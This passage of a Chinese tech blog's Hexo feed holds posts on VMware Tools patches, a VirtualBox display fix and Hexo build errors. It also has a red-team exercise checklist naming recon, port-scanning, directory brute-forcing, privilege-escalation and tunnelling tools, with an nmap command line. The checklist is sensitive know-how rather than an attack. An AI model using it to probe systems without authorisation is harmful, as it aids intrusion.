delay&#x27;</span>)<br>plt.plot(X_test, y_pred, color=<span class="hljs-string">&#x27;red&#x27;</span>, linewidth=<span class="hljs-number">2</span>)<br>plt.scatter(x=delays_df[<span class="hljs-string">&#x27;DEP_DELAY&#x27;</span>], y=delays_df[<span class="hljs-string">&#x27;ARR_DELAY&#x27;</span>], color=<span class="hljs-string">&#x27;blue&#x27;</span>,  alpha=<span class="hljs-number">0.3</span>)<br>plt.show()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Win7安装VMtools出现无法自动安装驱动程序</title>
    <link href="/2022/08/15/Tools/VM/win7%E5%AE%89%E8%A3%85VMtools%E5%A4%B1%E8%B4%A5/"/>
    <url>/2022/08/15/Tools/VM/win7%E5%AE%89%E8%A3%85VMtools%E5%A4%B1%E8%B4%A5/</url>
    
    <content type="html"><![CDATA[<blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_41326328/article/details/123134855">https://blog.csdn.net/qq_41326328/article/details/123134855</a></p></blockquote><p><strong>问题：</strong>Win7 SP1系统安装 VMtools 出现无法自动安装驱动程序问题</p><p><strong>原因：</strong>密码算法不一致</p><p>19 年之前 win7 都在使用 SHA1 算法，之后统一使用 SHA2 算法，算法不一致，导致无法自动安装。需要下载补丁来支持 SHA2 算法，这就是为什么网上一大堆人写文章要你检查更新的原因。</p><p><strong>解决方法：</strong>在 <a href="http://www.winwin7.com/soft/xtbd-7001.html">http://www.winwin7.com/soft/xtbd-7001.html</a> 下载补丁包</p><p>在虚拟机里打开下载网页，下载补丁包后进行安装，更新好补丁后再次安装 VMtools。</p><blockquote><p>原文链接：<a href="https://blog.csdn.net/CurtainWei/article/details/115416423">https://blog.csdn.net/CurtainWei/article/details/115416423</a></p></blockquote><p><strong>问题描述：</strong></p><p>在 Vmware Workstation 16 Pro 中简易安装 Windows 7 SP1 后，无法安装 VMware Tools，提示安装程序无法自动安装 Virtual Machine Communication Interface(VMCI) 驱动程序。必须手动安装此驱动程序。</p><p><strong>问题分析：</strong></p><p><a href="https://kb.vmware.com/s/article/78708">VMware Tools upgrade fails on Windows without SHA-2 code signing support (78708)</a></p><p>原来，微软更新了驱动程序的签名算法，从 2019 年初开始，逐步弃用SHA-1，改为SHA-2。个人推测新版的VMCI驱动用的是SHA-2签名，而win7不支持SHA-2签名，所以出现了这个问题。</p><p>不过，可以通过安装补丁来解决这个问题。</p><p><a href="https://support.microsoft.com/zh-cn/topic/针对-windows-和-wsus-的-2019-sha-2-代码签名支持要求-64d1c82d-31ee-c273-3930-69a4cde8e64f">针对 Windows 和 WSUS 的 2019 SHA-2 代码签名支持要求 - Microsoft 支持</a></p><div class="table-container"><table><thead><tr><th>目标日期</th><th>事件</th><th>适用于</th></tr></thead><tbody><tr><td>2019 年 3 月 12 日</td><td>独立安全更新 <code>KB4474419</code>和 <code>KB4490628</code>发布，引入了 SHA-2 代码签名支持。</td><td>Windows 7 SP1, Windows Server 2008 R2 SP1</td></tr></tbody></table></div><p><strong>解决方案：</strong></p><p>可以从 Microsoft Update Catalog 下载 KB4474419 和 KB4490628 这两个补丁，然后安装到 win7 虚拟机中。在没有成功安装 VMware Tools 的情况下，传文件不太方便，可以用虚拟机里浏览器访问下载页面，然后直接在虚拟机里下载安装。</p><p>下载地址：</p><ul><li><p>KB4474419：<a href="https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419">Microsoft Update Catalog</a></p></li><li><p>KB4490628：<a href="https://www.catalog.update.microsoft.com/search.aspx?q=4490628">Microsoft Update Catalog</a></p></li></ul><p>安装补丁后，重启虚拟机，然后重新VMware Tools即可。</p>]]></content>
    
    
    <categories>
      
      <category>VM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
      <tag>Win7</tag>
      
      <tag>VMtools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HW分享</title>
    <link href="/2022/07/15/HW/HW%E5%88%86%E4%BA%AB/"/>
    <url>/2022/07/15/HW/HW%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="HW分享"><a href="#HW分享" class="headerlink" title="HW分享"></a>HW分享</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><h4 id="google、bing、baidu"><a href="#google、bing、baidu" class="headerlink" title="google、bing、baidu"></a>google、bing、baidu</h4><h4 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h4><h4 id="fofa、zoomeye、shodan"><a href="#fofa、zoomeye、shodan" class="headerlink" title="fofa、zoomeye、shodan"></a>fofa、zoomeye、shodan</h4><h4 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">Oneforall: https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shmilylty/</span>OneForAll<br>subfinder<br>Layer子域名挖掘机<br></code></pre></td></tr></table></figure><h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><h4 id="真实-ip"><a href="#真实-ip" class="headerlink" title="真实 ip"></a>真实 ip</h4><p>判断有无 cdn：多地 ping、cdncheck</p><h4 id="找真实ip"><a href="#找真实ip" class="headerlink" title="找真实ip"></a>找真实ip</h4><p>fofa、国外国内访问</p><h4 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo nmap</span><br><span class="hljs-attribute">sudo masscan</span><br><span class="hljs-attribute">fscan</span><br></code></pre></td></tr></table></figure><h4 id="端口服务识别"><a href="#端口服务识别" class="headerlink" title="端口服务识别"></a>端口服务识别</h4><p>对扫描出来的端口进行版本识别和默认插件扫描</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sV -sC -Pn -v -<span class="hljs-literal">oN</span> file<span class="hljs-number">2</span> -p xx,xx,xx,xx ip<br></code></pre></td></tr></table></figure><h4 id="web服务"><a href="#web服务" class="headerlink" title="web服务"></a>web服务</h4><p><strong>目录探测</strong></p><p>寻找漏洞服务以及对网站结构形成初步认识：后台管理页面、文件上传界面、robots.txt、备份文件（git、DS_Store、phpinfo…）</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">dirb </span>url<br><span class="hljs-keyword">dirsearch </span>-u xxx.com -e *<br>gobuster <span class="hljs-keyword">dir </span>-wordlis pathfile --url xx.com<br>nikto -h url<br></code></pre></td></tr></table></figure><p><strong>cms 识别</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">linux</span>whatweb<br>游览器插件wappalyzer<br>cms 扫描工具wpscan等<br></code></pre></td></tr></table></figure><h2 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h2><h3 id="nday-Cve-or-poc"><a href="#nday-Cve-or-poc" class="headerlink" title="nday Cve or poc"></a>nday Cve or poc</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">AWVS</span> + xray<br>crawlergo + xray<br></code></pre></td></tr></table></figure><h3 id="常规-web-漏洞"><a href="#常规-web-漏洞" class="headerlink" title="常规 web 漏洞"></a>常规 web 漏洞</h3><p>SQL注入、XSS、CSRF、SSRF、目录穿越、文件读取、文件上传、文件包含、命令注入、RCE    </p><p>中间件（apache、IIS、Nginx）</p><p>框架（fastjson、weblogic、shiro）</p><p>CMS（dedecms、discuz、wordpress）</p><p>Editor（fckeditor、kindeditor、ewebeditor、Ueditor）</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>扫描内核：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">linpeas.sh: https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/carlospolop/</span>PEASS-ng<br>les.sh: https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jondonas/</span>linux-exploit-suggester-<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">frp: https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fatedier/</span>frp<br>ssh的socket代理<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HW</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HW</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VirtualBox Ubuntu开机后黑屏</title>
    <link href="/2022/07/15/Tools/VM/VirtualBox%20Ubuntu%E5%BC%80%E6%9C%BA%E5%90%8E%E9%BB%91%E5%B1%8F/"/>
    <url>/2022/07/15/Tools/VM/VirtualBox%20Ubuntu%E5%BC%80%E6%9C%BA%E5%90%8E%E9%BB%91%E5%B1%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="VirtualBox-Ubuntu开机后黑屏"><a href="#VirtualBox-Ubuntu开机后黑屏" class="headerlink" title="VirtualBox Ubuntu开机后黑屏"></a>VirtualBox Ubuntu开机后黑屏</h2><p><strong>问题：</strong>运行 ubuntu，在账户密码界面显示正常，输入用户名密码登录到桌面则黑屏。</p><p><strong>可以尝试按以下方法解决：</strong></p><ul><li><p>在 windows 下，以管理员方式打开 cmd，运行 netsh winsock reset（有文章说运行这步后要重启，实测是不用的）</p></li><li><p>如果还是不行，进行如下设置：</p><ul><li>虚拟机菜单栏：控制 == 设置 == 显示 == 显存大小 == 28</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>VM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
      <tag>VirtualBox</tag>
      
      <tag>Ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo issue and error</title>
    <link href="/2022/07/11/MessUp/Hexo-Issue-Error/"/>
    <url>/2022/07/11/MessUp/Hexo-Issue-Error/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo-issue-and-error"><a href="#Hexo-issue-and-error" class="headerlink" title="Hexo issue and error"></a>Hexo issue and error</h1><h2 id="一、Issue"><a href="#一、Issue" class="headerlink" title="一、Issue"></a>一、Issue</h2><h3 id="1、gitee-图片部署后无法正常显示问题"><a href="#1、gitee-图片部署后无法正常显示问题" class="headerlink" title="1、gitee 图片部署后无法正常显示问题"></a>1、gitee 图片部署后无法正常显示问题</h3><blockquote><p><a href="https://www.cnblogs.com/selier/p/9570650.html">Hexo使用细节及各种问题 - Selier - 博客园 (cnblogs.com)</a></p></blockquote><p>出现 gitee 图片本地正常显示部署后却不显示问题，但是如果直接访问图片显示正常 。</p><p><img src="/2022/07/11/MessUp/Hexo-Issue-Error/image-20230323134316335.png" alt="image-20230323134316335" style="zoom:67%;"></p><p><img src="/2022/07/11/MessUp/Hexo-Issue-Error/image-20230323134230467.png" alt="image-20230323134230467" style="zoom:67%;"></p><p><strong>解决方法</strong> ：403 forbidden，说明了这个网络资源这样获取是被拒绝的，只需要在头部添加一个 meta：<code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;</code></p><p>在 .md 文件中添加 meta，如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">---<br>title: test<br>date: 2022-7-11<br>categories: Test<br><span class="hljs-section">tags: Test</span><br><span class="hljs-section">---</span><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span> /&gt;</span></span><br><br><span class="hljs-section"># 标题</span><br><span class="hljs-section">## 内容</span><br><br></code></pre></td></tr></table></figure><h3 id="2、本地照片部署后无法正常显示问题"><a href="#2、本地照片部署后无法正常显示问题" class="headerlink" title="2、本地照片部署后无法正常显示问题"></a>2、本地照片部署后无法正常显示问题</h3><blockquote><p><a href="https://www.jianshu.com/p/3db6a61d3782">hexo使用markdown图片无法显示问题 - 简书 (jianshu.com)</a></p></blockquote><p>Hexo 老版本默认无法自动处理文章插入的本地图片，需要通过扩展插件支持，虽然新版本可以处理了但还是存在无法显示的问题，主要是因为 Hexo 处理后的文件路径多了一层文件夹，同时在新版本中老插件也出现问题。</p><p><strong>问题：</strong></p><p>由于 Hexo 3版本后对很多插件支持有问题，<a href="https://github.com/CodeFalling/hexo-asset-image.git">hexo-asset-image</a> 插件在处理 <code>data.permalink</code> 链接时出现路径错误，把年月去掉了，导致最后生成的路径为 <code>%d/xxx/xxx</code> 需要对其做兼容处理。通过判断当前版本是否等于<code>3</code>的版本做不同的路径分割。</p><p>在代码中加入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> version = <span class="hljs-built_in">String</span>(hexo.version).split(<span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>修改 <code>date.permalink</code> 处理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> link = data.permalink;  <br><span class="hljs-keyword">if</span>(version.length &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">Number</span>(version[<span class="hljs-number">0</span>]) == <span class="hljs-number">3</span>) <br>    <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>; <br><span class="hljs-keyword">else</span> <br>    <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>重新生成静态文件即可正确显示。</p><p>可直接安装已经修改过得插件 <code>npm install https://github.com/7ym0n/hexo-asset-image --save</code>。</p><p><strong>解决方法：</strong></p><p>1）配置 <code>_config.yml</code> 里面的 <code>post_asset_folder:false</code> 这个选项设置为 <code>true</code>。</p><p>2）安装 <a href="https://github.com/7ym0n/hexo-asset-image.git">hexo-asset-image</a>（已修改过的），运行 <code>hexo n &quot;xxxx&quot;</code> 来生成md博文时，<code>/source/_posts</code> 文件夹内除了 <code>xxxx.md</code> 文件还有一个同名的文件夹，把图片放入该文件夹即可。</p><p>3）使用 <code>![xxx](xxx/xxx.png)</code> 直接插入图片即可。</p><h2 id="二、Error"><a href="#二、Error" class="headerlink" title="二、Error"></a>二、Error</h2><h3 id="1、title-中含有-“-“-导致错误"><a href="#1、title-中含有-“-“-导致错误" class="headerlink" title="1、title 中含有 “: “ 导致错误"></a>1、title 中含有 “: “ 导致错误</h3><p><strong>错误：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">13562@DESKTOP-8HHTU8A MINGW64 /d/Blog/blog<br>$ hexo s<br>INFO  Validating config<br>INFO  Start processing<br>ERROR &#123;<br>  err: YAMLException: incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line at line 1, column 13:<br>      title: W1R3S: 1.0.1<br>                  ^<br>      at generateError (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:167:10)<br>      at throwError (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:173:9)<br>      at readBlockMapping (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1027:9)<br>      at composeNode (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1359:12)<br>      at readDocument (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1525:3)<br>      at loadDocuments (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1588:5)<br>      at Object.load (D:\Blog\blog\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js:1614:19)<br>      at parseYAML (D:\Blog\blog\node_modules\hexo-front-matter\lib\front_matter.js:69:23)<br>      at parse (D:\Blog\blog\node_modules\hexo-front-matter\lib\front_matter.js:50:12)<br>      at D:\Blog\blog\node_modules\hexo\lib\plugins\processor\post.js:51:20<br>      at tryCatcher (D:\Blog\blog\node_modules\bluebird\js\release\util.js:16:23)<br>      at Promise._settlePromiseFromHandler (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:544:35)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:604:18)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10)<br>      at Promise._settlePromises (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:729:18)<br>      at Promise._fulfill (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:673:18)<br>      at PromiseArray._resolve (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:127:19)<br>      at PromiseArray._promiseFulfilled (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:145:14)<br>      at PromiseArray._iterate (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:115:31)<br>      at PromiseArray.init [as _init] (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:79:10)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:601:21)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10)<br>      at Promise._settlePromises (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:729:18)<br>      at Promise._fulfill (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:673:18)<br>      at PromiseArray._resolve (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:127:19)<br>      at PromiseArray._promiseFulfilled (D:\Blog\blog\node_modules\bluebird\js\release\promise_array.js:145:14)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:609:26)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10) &#123;<br>    reason: <span class="hljs-string">&#x27;incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line&#x27;</span>,<br>    mark: Mark &#123;<br>      name: null,<br>      buffer: <span class="hljs-string">&#x27;title: W1R3S: 1.0.1\n&#x27;</span> +<br>        <span class="hljs-string">&#x27;date: 2022-05-01\n&#x27;</span> +<br>        <span class="hljs-string">&#x27;categories: Penetration\n&#x27;</span> +<br>        <span class="hljs-string">&#x27;tags: [Penetration, vulnhub]\n&#x27;</span> +<br>        <span class="hljs-string">&#x27;\x00&#x27;</span>,<br>      position: 12,<br>      line: 0,<br>      column: 12<br>    &#125;<br>  &#125;<br>&#125; Process failed: %s _posts/Penetration/Vulnhub/Part-1/0x02 W1R3S.md<br></code></pre></td></tr></table></figure><p><strong>原因：</strong> <code>title</code> 中有<strong>英文冒号加空格</strong>。例如：<code>title: W1R3S: 1.0.1</code></p><p><strong>解决方法：</strong>可以把英文的 <code>:</code> 改成中文的 <code>：</code> 。</p><h3 id="2、内容含有-导致错误"><a href="#2、内容含有-导致错误" class="headerlink" title="2、内容含有  导致错误"></a>2、内容含有 {{  }} 导致错误</h3><p><strong>错误：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hexo s</span><br>INFO  Validating config<br>INFO  Start processing<br>INFO  [Fluid] 读取 _config.yml 中 theme_config 配置项覆盖配置<br>update link as:--&gt;/2023/03/23/Test/test-local-image/image-20230323112709634.png<br>update link as:--&gt;/2023/03/23/Test/test-local-image/image-20230323112709634.png<br>FATAL &#123;<br>  err: Error [Nunjucks Error]: _posts/MessUp/Hexo-Issue-Error.md [Line 30, Column 89] unexpected token: &#125;&#125;<br>      =====               Context Dump               =====<br>      === (line number probably different from source) ===<br>    25 | &lt;p&gt;3）使用 &lt;code&gt;![xxx](xxx/xxx.png)&lt;/code&gt; 直接插入图片即可。&lt;/p&gt;<br>    26 | &lt;h2 id=&quot;二、Error&quot;&gt;&lt;a href=&quot;#二、Error&quot; class=&quot;headerlink&quot; title=&quot;二、Error&quot;&gt;&lt;/a&gt;二、Error&lt;/h2&gt;&lt;h3 id=&quot;1、title-中含有-“-“-导致错误&quot;&gt;&lt;a href=&quot;#1、title-中含有-“-“-导致错误&quot; class=&quot;headerlink&quot; title=&quot;1、title 中含有 “: “ 导致错误&quot;&gt;&lt;/a&gt;1、title 中含有 “: “ 导致错误&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;hexo s&lt;/code&gt; 后出现错误：&lt;/strong&gt;&lt;/p&gt;<br>    27 | &lt;!--code 3--&gt;<br>    28 | &lt;p&gt;&lt;strong&gt;原因：&lt;/strong&gt; &lt;code&gt;title&lt;/code&gt; 中有&lt;strong&gt;英文冒号加空格&lt;/strong&gt;。例如：&lt;code&gt;title: W1R3S: 1.0.1&lt;/code&gt;&lt;/p&gt;<br>    29 | &lt;p&gt;&lt;strong&gt;解决方法：&lt;/strong&gt;可以把英文的 &lt;code&gt;:&lt;/code&gt; 改成中文的 &lt;code&gt;：&lt;/code&gt; 。&lt;/p&gt;<br>    30 | &lt;h3 id=&quot;2、内容含有-“-”-导致错误&quot;&gt;&lt;a href=&quot;#2、内容含有-“-”-导致错误&quot; class=&quot;headerlink&quot; title=&quot;2、内容含有 “&#123;&#123;&#125;&#125;” 导致错误&quot;&gt;&lt;/a&gt;2、内容含有 “&#123;&#123;&#125;&#125;” 导致错误&lt;/h3&gt;<br>      =====             Context Dump Ends            =====<br>      at formatNunjucksError (D:\Blog\blog\node_modules\hexo\lib\extend\tag.js:171:13)<br>      at D:\Blog\blog\node_modules\hexo\lib\extend\tag.js:246:36<br>      at tryCatcher (D:\Blog\blog\node_modules\bluebird\js\release\util.js:16:23)<br>      at Promise._settlePromiseFromHandler (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:547:31)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:604:18)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10)<br>      at Promise._settlePromises (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:725:18)<br>      at _drainQueueStep (D:\Blog\blog\node_modules\bluebird\js\release\async.js:93:12)<br>      at _drainQueue (D:\Blog\blog\node_modules\bluebird\js\release\async.js:86:9)<br>      at Async._drainQueues (D:\Blog\blog\node_modules\bluebird\js\release\async.js:102:5)<br>      at Immediate.Async.drainQueues [as _onImmediate] (D:\Blog\blog\node_modules\bluebird\js\release\async.js:15:14)<br>      at processImmediate (internal/timers.js:464:21) &#123;<br>    line: 30,<br>    location: &#x27;_posts/MessUp/Hexo-Issue-Error.md [Line 30, Column 89]&#x27;,<br>    type: &#x27;unexpected token: &#125;&#125;&#x27;<br>  &#125;<br>&#125; Something&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html<br><br></code></pre></td></tr></table></figure><p><strong>原因：</strong></p><p>根据提示访问 <a href="https://hexo.io/docs/troubleshooting.html">https://hexo.io/docs/troubleshooting.html</a> ，找到原因：</p><p><img src="/2022/07/11/MessUp/Hexo-Issue-Error/image-20230323141735849.png" alt="image-20230323141735849" style="zoom:67%;"></p><p><strong>解决方法：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># 方法1</span><br>&#123;% raw %&#125;<br>Hello &#123;&#123; world &#125;&#125;<br>&#123;% endraw %&#125;<br><br><span class="hljs-section"># 方法2</span><br><span class="hljs-code">```</span><br><span class="hljs-code">Hello &#123;&#123; world &#125;&#125;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># 方法3</span><br><span class="hljs-code">`Hello &#123;&#123; world &#125;&#125;`</span><br></code></pre></td></tr></table></figure><h3 id="3、标题使用-导致错误"><a href="#3、标题使用-导致错误" class="headerlink" title="3、标题使用  导致错误"></a>3、标题使用 `{{  }}` 导致错误</h3><p><strong>错误：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s<br>INFO  Validating config<br>INFO  Start processing<br>INFO  [Fluid] 读取 _config.yml 中 theme_config 配置项覆盖配置<br>FATAL &#123;<br>  err: AssertionError [ERR_ASSERTION]: The expression evaluated to a falsy value:<br><br>    assert(cache[index])<br><br>      at D:\Blog\blog\node_modules\hexo\lib\hexo\post.js:25:3<br>      at String.replace (&lt;anonymous&gt;)<br>      at PostRenderCache.restoreAllSwigTags (D:\Blog\blog\node_modules\hexo\lib\hexo\post.js:37:26)<br>      at Object.onRenderEnd (D:\Blog\blog\node_modules\hexo\lib\hexo\post.js:291:35)<br>      at D:\Blog\blog\node_modules\hexo\lib\hexo\render.js:79:21<br>      at tryCatcher (D:\Blog\blog\node_modules\bluebird\js\release\util.js:16:23)<br>      at Promise._settlePromiseFromHandler (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:547:31)<br>      at Promise._settlePromise (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:604:18)<br>      at Promise._settlePromise0 (D:\Blog\blog\node_modules\bluebird\js\release\promise.js:649:10)<br>      at Promise._settlePromises 